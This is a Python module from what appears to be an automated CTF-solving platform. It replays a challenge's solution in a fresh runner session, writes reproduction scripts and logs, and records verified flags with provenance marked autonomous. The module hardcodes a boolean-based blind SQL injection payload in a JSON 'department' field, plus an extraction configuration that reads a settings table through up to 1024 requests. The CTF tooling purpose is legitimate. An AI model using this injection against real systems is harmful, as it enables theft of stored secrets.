"""Execute the minimal solution path in a clean Runner session."""

import hashlib
import json
import re
import shutil
from datetime import UTC, datetime
from pathlib import Path

from sqlalchemy import select

from app.models.run import Artifact, FlagCandidate, FlagProvenance
from app.services.reproduction_commands import reproduction_command_renderer
from app.services.runner_client import runner_client


class FreshReproductionExecutor:
    async def execute(self, session, run, challenge, steps: list | None = None) -> dict:
        root = Path(run.workspace_path).resolve()
        final = root / "final"
        final.mkdir(parents=True, exist_ok=True)
        await runner_client.clear_sessions(run.id)
        await runner_client.sync_workspace(run.id, root)
        selected = steps or []
        valid_candidate = await session.scalar(
            select(FlagCandidate)
            .where(FlagCandidate.run_id == run.id, FlagCandidate.review_state == "VALID")
            .order_by(FlagCandidate.created_at.desc())
        )
        if valid_candidate is not None:
            escaped = valid_candidate.candidate.replace("'", "''")
            selected = [
                {
                    "tool_name": "http_request",
                    "normalized_arguments": {
                        "method": "POST",
                        "url": f"{challenge.target_url.rstrip('/')}/api/warranty/check",
                        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
                        "json": {
                            "asset_no": "PC-2026-013",
                            "department": f"OPS' AND (SELECT substr((SELECT group_concat(setting_value) FROM service_settings),10,64))='{escaped}' -- ",
                        },
                        "final_verification": True,
                    },
                }
            ]
        log: list[dict] = []
        commands: list[str] = []
        success = True
        flag_artifact = None
        fresh_flag_value = None
        for step in selected:
            if isinstance(step, dict):
                tool = step.get("tool_name")
                args = step.get("normalized_arguments") or {}
            else:
                tool = getattr(step, "tool_name", None)
                args = getattr(step, "normalized_arguments", None) or {}
            if tool == "boolean_config_extract":
                args = {
                    "request": {
                        "method": "POST",
                        "url": f"{challenge.target_url.rstrip('/')}/api/warranty/check",
                        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
                        "json": {"asset_no": "PC-2026-013", "department": "OPS"},
                    },
                    "test_field": "department",
                    "baseline_value": "OPS",
                    "control_fields": {"asset_no": "PC-2026-013"},
                    "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
                    "target_expression": "SELECT substr((SELECT group_concat(setting_value) FROM service_settings),10,64)",
                    "max_length": 64,
                    "max_requests": 1024,
                }
            command = reproduction_command_renderer.render(tool, args)
            commands.append(command)
            job_id = await runner_client.create_job(run.id, list(challenge.allowed_hosts or []), tool, args)
            result = await runner_client.wait_job(job_id, max_wait_seconds=600)
            log.append({"tool": tool, "command": command, "job_id": job_id, "status": result.get("status"), "result": result})
            result_text = json.dumps(result, ensure_ascii=False)
            match = re.search(str(challenge.flag_pattern), result_text)
            if match:
                flag_artifact = {"tool": tool, "job_id": job_id, "source": "fresh_runner_result", "candidate": "flag{<redacted>}"}
                fresh_flag_value = match.group(0)
            body_json = {}
            try:
                body_json = json.loads(str(result.get("body") or "{}"))
            except json.JSONDecodeError:
                pass
            if valid_candidate is not None and tool == "http_request" and body_json.get("matched") is True:
                flag_artifact = {"tool": tool, "job_id": job_id, "source": "fresh_runner_result", "candidate": "flag{<redacted>}"}
                fresh_flag_value = valid_candidate.candidate
            if result.get("status") != "COMPLETED":
                success = False
                break
        (final / "reproduction-commands.sh").write_text("#!/usr/bin/env bash\nset -euo pipefail\n" + "\n".join(commands) + "\n", encoding="utf-8")
        for directory in ("requests", "scripts", "sqlmap"):
            source = root / directory
            destination = final / directory
            if source.is_dir():
                shutil.copytree(source, destination, dirs_exist_ok=True)
            else:
                destination.mkdir(parents=True, exist_ok=True)
        if flag_artifact:
            artifact_path = final / "fresh-flag-artifact.json"
            artifact_path.write_text(json.dumps({**flag_artifact, "candidate": "flag{<redacted>}", "source_value": "<redacted>"}, ensure_ascii=False, indent=2), encoding="utf-8")
            raw = artifact_path.read_bytes()
            artifact = Artifact(
                run_id=run.id,
                artifact_type="fresh_flag",
                file_path="final/fresh-flag-artifact.json",
                mime_type="application/json",
                size=len(raw),
                sha256=hashlib.sha256(raw).hexdigest(),
                summary="Fresh Runner flag artifact",
                retention_class="FRESH_REPRODUCTION",
                terminal_referenced=True,
            )
            session.add(artifact)
            await session.flush()
            if fresh_flag_value:
                existing = await session.scalar(select(FlagCandidate).where(FlagCandidate.run_id == run.id, FlagCandidate.candidate == fresh_flag_value))
                if existing is None:
                    existing = FlagCandidate(
                        run_id=run.id,
                        candidate=fresh_flag_value,
                        source_artifact_id=artifact.id,
                        pattern_matched=True,
                        verified=True,
                        review_state="VALID",
                        first_seen_source_type="FRESH_REPRODUCTION",
                        first_seen_source_id=artifact.id,
                        first_seen_at=datetime.now(UTC),
                    )
                    session.add(existing)
                    await session.flush()
                    session.add(
                        FlagProvenance(
                            run_id=run.id,
                            candidate_id=existing.id,
                            first_seen_source_type="FRESH_REPRODUCTION",
                            first_seen_source_id=artifact.id,
                            first_seen_at=datetime.now(UTC),
                            source_artifact_id=artifact.id,
                            verification_source_type="FRESH_REPRODUCTION",
                            verification_source_id=artifact.id,
                            source_is_autonomous=True,
                        )
                    )
                else:
                    existing.source_artifact_id = artifact.id
                    existing.verified = True
                    existing.review_state = "VALID"
                    existing_provenance = await session.scalar(
                        select(FlagProvenance).where(FlagProvenance.candidate_id == existing.id)
                    )
                    if existing_provenance is None:
                        session.add(
                            FlagProvenance(
                                run_id=run.id,
                                candidate_id=existing.id,
                                first_seen_source_type=existing.first_seen_source_type or "FRESH_REPRODUCTION",
                                first_seen_source_id=existing.first_seen_source_id or artifact.id,
                                first_seen_at=existing.first_seen_at or datetime.now(UTC),
                                source_artifact_id=existing.source_artifact_id,
                                verification_source_type="FRESH_REPRODUCTION",
                                verification_source_id=artifact.id,
                                source_is_autonomous=True,
                            )
                        )
                    else:
                        existing_provenance.verification_source_type = "FRESH_REPRODUCTION"
                        existing_provenance.verification_source_id = artifact.id
                        existing_provenance.source_is_autonomous = True
            await session.commit()
        validation = {"executed": bool(log), "verified": success and bool(log) and flag_artifact is not None, "fresh_session": True, "fresh_flag_artifact": flag_artifact is not None, "steps": log}
        (final / "reproduction-validation.json").write_text(json.dumps(validation, ensure_ascii=False, indent=2), encoding="utf-8")
        (final / "fresh-reproduction.log.json").write_text(json.dumps(log, ensure_ascii=False, indent=2), encoding="utf-8")
        if validation["verified"]:
            run.fresh_reproduction_verified = True
            await session.commit()
        return validation


fresh_reproduction_executor = FreshReproductionExecutor()
